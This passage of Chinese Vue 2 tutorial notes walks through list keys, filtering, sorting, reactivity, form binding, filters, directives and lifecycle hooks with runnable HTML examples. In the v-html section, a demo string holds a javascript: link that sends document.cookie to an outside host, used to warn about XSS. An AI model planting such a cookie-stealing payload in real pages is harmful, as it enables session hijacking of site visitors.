						{id:'003',name:'王五',age:20}
					],
					car:{
						name:'奥迪A8',
						price:'70万',
						color:'黑色'
					},
					str:'hello'
				}
			})
		</script>
</html>
```

-  面试题：react、vue中的key有什么作用？（key的内部原理）
-  虚拟DOM中key的作用
-  变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较
-  对比规则
  - 旧虚拟DOM中找到了与新虚拟DOM相同的key
    - 若虚拟DOM中内容没变, 直接使用之前的真实DOM！
    - 若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
  - 旧虚拟DOM中未找到与新虚拟DOM相同的key,创建新的真实DOM，随后渲染到到页面
-  用index作为key可能会引发的问题
  - 若对数据进行：逆序添加、逆序删除等破坏顺序操作,会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
  - 如果结构中还包含输入类的DOM,会产生错误DOM更新 ==> 界面有问题。
-  开发中如何选择key
  - 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
  - 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
    使用index作为key是没有问题的。

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>key的原理</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 遍历数组 -->
			<h2>人员列表（遍历数组）</h2>
			<button @click.once="add">添加一个老刘</button>
			<ul>
				<li v-for="(p,index) of persons" :key="index">
					{{p.name}}-{{p.age}}
					<input type="text">
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					]
				},
				methods: {
					add(){
						const p = {id:'004',name:'老刘',age:40}
						this.persons.unshift(p)
					}
				},
			})
		</script>
</html>
```

- 列表过滤

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>列表过滤</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<ul>
				<li v-for="(p,index) of filPerons" :key="index">
					{{p.name}}-{{p.age}}-{{p.sex}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			//用watch实现
			//#region 
			/* new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					],
					filPerons:[]
				},
				watch:{
					keyWord:{
						immediate:true,
						handler(val){
							this.filPerons = this.persons.filter((p)=>{
								return p.name.indexOf(val) !== -1
							})
						}
					}
				}
			}) */
			//#endregion
			
			//用computed实现
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					]
				},
				computed:{
					filPerons(){
						return this.persons.filter((p)=>{
							return p.name.indexOf(this.keyWord) !== -1
						})
					}
				}
			}) 
		</script>
</html>
```



- 列表排序

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>列表排序</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<button @click="sortType = 2">年龄升序</button>
			<button @click="sortType = 1">年龄降序</button>
			<button @click="sortType = 0">原顺序</button>
			<ul>
				<li v-for="(p,index) of filPerons" :key="p.id">
					{{p.name}}-{{p.age}}-{{p.sex}}
					<input type="text">
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					sortType:0, //0原顺序 1降序 2升序
					persons:[
						{id:'001',name:'马冬梅',age:30,sex:'女'},
						{id:'002',name:'周冬雨',age:31,sex:'女'},
						{id:'003',name:'周杰伦',age:18,sex:'男'},
						{id:'004',name:'温兆伦',age:19,sex:'男'}
					]
				},
				computed:{
					filPerons(){
						const arr = this.persons.filter((p)=>{
							return p.name.indexOf(this.keyWord) !== -1
						})
						//判断一下是否需要排序
						if(this.sortType){
							arr.sort((p1,p2)=>{
								return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
							})
						}
						return arr
					}
				}
			}) 

		</script>
</html>
```



- 更新时的一个问题

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>更新时的一个问题</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<button @click="updateMei">更新马冬梅的信息</button>
			<ul>
				<li v-for="(p,index) of persons" :key="p.id">
					{{p.name}}-{{p.age}}-{{p.sex}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			const vm = new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'马冬梅',age:30,sex:'女'},
						{id:'002',name:'周冬雨',age:31,sex:'女'},
						{id:'003',name:'周杰伦',age:18,sex:'男'},
						{id:'004',name:'温兆伦',age:19,sex:'男'}
					]
				},
				methods: {
					updateMei(){
						// this.persons[0].name = '马老师' //奏效
						// this.persons[0].age = 50 //奏效
						// this.persons[0].sex = '男' //奏效
						// this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
						this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
					}
				}
			}) 

		</script>
</html>
```



- Vue监测数据改变的原理

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue监测数据改变的原理</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>学校名称：{{name}}</h2>
			<h2>学校地址：{{address}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				address:'北京',
				student:{
					name:'tom',
					age:{
						rAge:40,
						sAge:29,
					},
					friends:[
						{name:'jerry',age:35}
					]
				}
			}
		})
	</script>
</html>
```



- 模拟一个数据监测

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Document</title>
	</head>
	<body>
		<script type="text/javascript" >

			let data = {
				name:'尚硅谷',
				address:'北京',
			}

			//创建一个监视的实例对象，用于监视data中属性的变化
			const obs = new Observer(data)		
			console.log(obs)	

			//准备一个vm实例对象
			let vm = {}
			vm._data = data = obs

			function Observer(obj){
				//汇总对象中所有的属性形成一个数组
				const keys = Object.keys(obj)
				//遍历
				keys.forEach((k)=>{
					Object.defineProperty(this,k,{
						get(){
							return obj[k]
						},
						set(val){
							console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
							obj[k] = val
						}
					})
				})
			}
			
			


		</script>
	</body>
</html>
```



- Vue.set的使用

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue监测数据改变的原理</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学校信息</h1>
			<h2>学校名称：{{school.name}}</h2>
			<h2>学校地址：{{school.address}}</h2>
			<h2>校长是：{{school.leader}}</h2>
			<hr/>
			<h1>学生信息</h1>
			<button @click="addSex">添加一个性别属性，默认值是男</button>
			<h2>姓名：{{student.name}}</h2>
			<h2 v-if="student.sex">性别：{{student.sex}}</h2>
			<h2>年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>
			<h2>朋友们</h2>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				school:{
					name:'尚硅谷',
					address:'北京',
				},
				student:{
					name:'tom',
					age:{
						rAge:40,
						sAge:29,
					},
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				}
			}
		})
	</script>
</html>
```



- 监测数据_数组

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue监测数据改变的原理_数组</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学校信息</h1>
			<h2>学校名称：{{school.name}}</h2>
			<h2>学校地址：{{school.address}}</h2>
			<h2>校长是：{{school.leader}}</h2>
			<hr/>
			<h1>学生信息</h1>
			<button @click="addSex">添加一个性别属性，默认值是男</button>
			<h2>姓名：{{student.name}}</h2>
			<h2 v-if="student.sex">性别：{{student.sex}}</h2>
			<h2>年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>
			<h2>爱好</h2>
			<ul>
				<li v-for="(h,index) in student.hobby" :key="index">
					{{h}}
				</li>
			</ul>
			<h2>朋友们</h2>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				school:{
					name:'尚硅谷',
					address:'北京',
				},
				student:{
					name:'tom',
					age:{
						rAge:40,
						sAge:29,
					},
					hobby:['抽烟','喝酒','烫头'],
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				}
			}
		})
	</script>
</html>
```



- 总结数据监测
  - Vue监视数据的原理
    - vue会监视data中所有层次的数据。
    - 如何监测对象中的数据，通过setter实现监视，且要在new Vue时就传入要监测的数据
    - 对象中后追加的属性，Vue默认不做响应式处理
    - 如需给后添加的属性做响应式，请使用如下API：Vue.set(target，propertyName/index，value) 或 vm.$set(target，propertyName/index，value)
    - 如何监测数组中的数据，通过包裹数组更新元素的方法实现，本质就是做了两件事
      - 调用原生对应的方法对数组进行更新。
      - 重新解析模板，进而更新页面。
    - 在Vue修改数组中的某个元素一定要用如下方法
      - 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
      - Vue.set() 或 vm.$set()
    - 特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>总结数据监视</title>
		<style>
			button{
				margin-top: 10px;
			}
		</style>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学生信息</h1>
			<button @click="student.age++">年龄+1岁</button> <br/>
			<button @click="addSex">添加性别属性，默认值：男</button> <br/>
			<button @click="student.sex = '未知' ">修改性别</button> <br/>
			<button @click="addFriend">在列表首位添加一个朋友</button> <br/>
			<button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
			<button @click="addHobby">添加一个爱好</button> <br/>
			<button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
			<button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
			<h3>姓名：{{student.name}}</h3>
			<h3>年龄：{{student.age}}</h3>
			<h3 v-if="student.sex">性别：{{student.sex}}</h3>
			<h3>爱好：</h3>
			<ul>
				<li v-for="(h,index) in student.hobby" :key="index">
					{{h}}
				</li>
			</ul>
			<h3>朋友们：</h3>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				student:{
					name:'tom',
					age:18,
					hobby:['抽烟','喝酒','烫头'],
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				},
				addFriend(){
					this.student.friends.unshift({name:'jack',age:70})
				},
				updateFirstFriendName(){
					this.student.friends[0].name = '张三'
				},
				addHobby(){
					this.student.hobby.push('学习')
				},
				updateHobby(){
					// this.student.hobby.splice(0,1,'开车')
					// Vue.set(this.student.hobby,0,'开车')
					this.$set(this.student.hobby,0,'开车')
				},
				removeSmoke(){
					this.student.hobby = this.student.hobby.filter((h)=>{
						return h !== '抽烟'
					})
				}
			}
		})
	</script>
</html>
```

## 收集表单数据

- 若：`<input type="text"/>`，则v-model收集的是value值，用户输入的就是value值。
- 若：`<input type="radio"/>`，则v-model收集的是value值，且要给标签配置value值。
- 若：`<input type="checkbox"/>`
  - 没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
  - 配置input的value属性
    - v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
    - v-model的初始值是数组，那么收集的的就是value组成的数组

- 备注：v-model的三个修饰符
  - lazy：失去焦点再收集数据
  - number：输入字符串转为有效的数字
  - trim：输入首尾空格过滤

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>收集表单数据</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<form @submit.prevent="demo">
				账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
				密码：<input type="password" v-model="userInfo.password"> <br/><br/>
				年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
				性别：
				男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
				女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
				爱好：
				学习<input type="checkbox" v-model="userInfo.hobby" value="study">
				打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
				吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
				<br/><br/>
				所属校区
				<select v-model="userInfo.city">
					<option value="">请选择校区</option>
					<option value="beijing">北京</option>
					<option value="shanghai">上海</option>
					<option value="shenzhen">深圳</option>
					<option value="wuhan">武汉</option>
				</select>
				<br/><br/>
				其他信息：
				<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
				<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
				<button>提交</button>
			</form>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				userInfo:{
					account:'',
					password:'',
					age:18,
					sex:'female',
					hobby:[],
					city:'beijing',
					other:'',
					agree:''
				}
			},
			methods: {
				demo(){
					console.log(JSON.stringify(this.userInfo))
				}
			}
		})
	</script>
</html>
```

## 过滤器

- 定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）
- 注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
- 使用过滤器：`{{ xxx | 过滤器名}}`  或  v-bind:属性 = "xxx | 过滤器名"
- 过滤器也可以接收额外参数、多个过滤器也可以串联，并没有改变原本的数据, 是产生新的对应的数据

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>过滤器</title>
		<script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="../js/dayjs.min.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>显示格式化后的时间</h2>
			<!-- 计算属性实现 -->
			<h3>现在是：{{fmtTime}}</h3>
			<!-- methods实现 -->
			<h3>现在是：{{getFmtTime()}}</h3>
			<!-- 过滤器实现 -->
			<h3>现在是：{{time | timeFormater}}</h3>
			<!-- 过滤器实现（传参） -->
			<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
			<h3 :x="msg | mySlice">尚硅谷</h3>
		</div>

		<div id="root2">
			<h2>{{msg | mySlice}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		//全局过滤器
		Vue.filter('mySlice',function(value){
			return value.slice(0,4)
		})
		
		new Vue({
			el:'#root',
			data:{
				time:1621561377603, //时间戳
				msg:'你好，尚硅谷'
			},
			computed: {
				fmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			methods: {
				getFmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			//局部过滤器
			filters:{
				timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
					// console.log('@',value)
					return dayjs(value).format(str)
				}
			}
		})

		new Vue({
			el:'#root2',
			data:{
				msg:'hello,atguigu!'
			}
		})
	</script>
</html>
```

## 内置指令

### v-text

我们学过的指令

- v-bind  : 单向绑定解析表达式, 可简写为 :xxx
- v-model : 双向数据绑定
- v-for  : 遍历数组/对象/字符串
- v-on   : 绑定事件监听, 可简写为@
- v-if     : 条件渲染（动态控制节点是否存存在）
- v-else  : 条件渲染（动态控制节点是否存存在）
- v-show  : 条件渲染 (动态控制节点是否展示)
- v-text指令
- 作用：向其所在的节点中渲染文本内容。
- 与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-text指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-text="name"></div>
			<div v-text="str"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>'
			}
		})
	</script>
</html>
```

### v-html

- 作用：向指定节点中渲染包含html结构的内容
- 与插值语法的区别
  - v-html会替换掉节点中所有的内容，{{xx}}则不会
  - v-html可以识别html结构
- 严重注意：v-html有安全性问题
  - 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击
  - 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-html指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-html="str"></div>
			<div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
</html>
```

### v-cloak

- 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性
- 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-cloak指令</title>
		<style>
			[v-cloak]{
				display:none;
			}
		</style>
		<!-- 引入Vue -->
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-cloak>{{name}}</h2>
		</div>
		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
	</body>
	
	<script type="text/javascript">
		console.log(1)
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```

### v-once

- v-once所在节点在初次动态渲染后，就视为静态内容了
- 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-once指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-once>初始化的n值是:{{n}}</h2>
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```

### v-pre

- 跳过其所在节点的编译过程
- 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-pre指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-pre>Vue其实很简单</h2>
			<h2 >当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```

## 自定义指令

- 定义语法

  - 局部指令

    - new Vue({directives:{指令名:配置对象}}) 或 new Vue({directives{指令名:回调函数}})

  - 全局指令

    - Vue.directive(指令名,配置对象) 或  Vue.directive(指令名,回调函数)

- 配置对象中常用的3个回调
  - bind：指令与元素成功绑定时调用
  - inserted：指令所在元素被插入页面时调用
  - update：指令所在模板结构被重新解析时调用

- 备注
  - 指令定义时不加v-，但使用时要加v-；
  - 指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>自定义指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
				需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>{{name}}</h2>
			<h2>当前的n值是：<span v-text="n"></span> </h2>
			<!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
			<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
			<button @click="n++">点我n+1</button>
			<hr/>
			<input type="text" v-fbind:value="n">
		</div>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false

		//定义全局指令
		/* Vue.directive('fbind',{
			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		}) */

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:1
			},
			directives:{
				//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
				/* 'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, */
				big(element,binding){
					console.log('big',this) //注意此处的this是window
					// console.log('big')
					element.innerText = binding.value * 10
				},
				fbind:{
					//指令与元素成功绑定时（一上来）
					bind(element,binding){
						element.value = binding.value
					},
					//指令所在元素被插入页面时
					inserted(element,binding){
						element.focus()
					},
					//指令所在的模板被重新解析时
					update(element,binding){
						element.value = binding.value
					}
				}
			}
		})
		
	</script>
</html>
```

## 生命周期

- 又名：生命周期回调函数、生命周期函数、生命周期钩子。

- 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。

- 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。

- 生命周期函数中的this指向是vm 或 组件实例对象。

[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-ZuQE83jA-1679118224607)(https://ypycdn.nanshuo.icu/posts/vue/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png)]

### 引出生命周期

 ```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>引出生命周期</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-if="a">你好啊</h2>
			<h2 :style="{opacity}">欢迎学习Vue</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		 new Vue({
			el:'#root',
			data:{
				a:false,
				opacity:1
			},
			methods: {
				
			},
			//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
			mounted(){
				console.log('mounted',this)
				setInterval(() => {
					this.opacity -= 0.01
					if(this.opacity <= 0) this.opacity = 1
				},16)
			},
		})

		//通过外部的定时器实现（不推荐）
		/* setInterval(() => {
			vm.opacity -= 0.01
			if(vm.opacity <= 0) vm.opacity = 1
		},16) */
	</script>
</html>
 ```

### 分析生命周期

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>分析生命周期</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root" :x="n">
			<h2 v-text="n"></h2>
			<h2>当前的n值是：{{n}}</h2>
			<button @click="add">点我n+1</button>
			<button @click="bye">点我销毁vm</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			// template:`
			// 	<div>
			// 		<h2>当前的n值是：{{n}}</h2>
			// 		<button @click="add">点我n+1</button>
			// 	</div>
			// `,
			data:{
				n:1
			},
			methods: {
				add(){
					console.log('add')
					this.n++
				},
				bye(){
					console.log('bye')
					this.$destroy()
				}
			},
			watch:{
				n(){
					console.log('n变了')
				}
			},
			beforeCreate() {
				console.log('beforeCreate')
			},
			created() {
				console.log('created')
			},
			beforeMount() {
				console.log('beforeMount')
			},
			mounted() {
				console.log('mounted')
			},
			beforeUpdate() {
				console.log('beforeUpdate')
			},
			updated() {
				console.log('updated')
			},
			beforeDestroy() {
				console.log('beforeDestroy')
			},
			destroyed() {
				console.log('destroyed')
			},
		})
	</script>
</html>
```

### 总结生命周期

常用的生命周期钩子：

- mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。

- beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

关于销毁Vue实例

- 销毁后借助Vue开发者工具看不到任何信息。

- 销毁后自定义事件会失效，但原生DOM事件依然有效。

- 一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>引出生命周期</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 :style="{opacity}">欢迎学习Vue</h2>
			<button @click="opacity = 1">透明度设置为1</button>
			<button @click="stop">点我停止变换</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		 new Vue({
			el:'#root',
			data:{
				opacity:1
			},
			methods: {
				stop(){
					this.$destroy()
				}
			},
			//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
			mounted(){
				console.log('mounted',this)
				this.timer = setInterval(() => {
					console.log('setInterval')
					this.opacity -= 0.01
					if(this.opacity <= 0) this.opacity = 1
				},16)
			},
			beforeDestroy() {
				clearInterval(this.timer)
				console.log('vm即将驾鹤西游了')
			},
		})

	</script>
</html>
```

# Vue组件化编程

## 组件的理解

理解：用来实现局部（特定）功能效果的代码集合（html、js、css、images、mp3、mp4...）

作用：复用代码，简化项目编码，提高运行效率

- 传统方式编写应用

![image-20230212160528779](https://ypycdn.nanshuo.icu/posts/vue/image-20230212160528779.png)


- 组件的定义

![image-20230212161111839](https://ypycdn.nanshuo.icu/posts/vue/image-20230212161111839.png)

- 使用组件方式编写应用
  ![image-20230212160828139](https://ypycdn.nanshuo.icu/posts/vue/image-20230212160828139.png)


## 非单文件组件

含义：一个文件中包含n个组件

Vue 的非单文件组件指的是在 JavaScript 文件中编写 Vue 组件的方式，即通过 Vue.extend() 方法或 Vue.component() 方法来定义组件。与单文件组件不同的是，非单文件组件通常将组件的模板、样式和脚本分别写在不同的地方，因此可读性较差，不便于维护。

缺点：模板编写没有提示，没有构建过程, 无法将 ES6 转换成 ES5，不支持组件的 CSS，真正开发中几乎不用

Vue中使用组件的三大步骤

- 定义组件(创建组件)

- 注册组件

- 使用组件(写组件标签)

如何定义一个组件？

- 使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；区别如下：

  - el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
  - data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。

  - 备注：使用template可以配置组件结构。

- 如何注册组件？
  - 局部注册：靠new Vue的时候传入components选项
  - 全局注册：靠Vue.component('组件名',组件)

- 编写组件标签：`<school></school>`

例子：

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
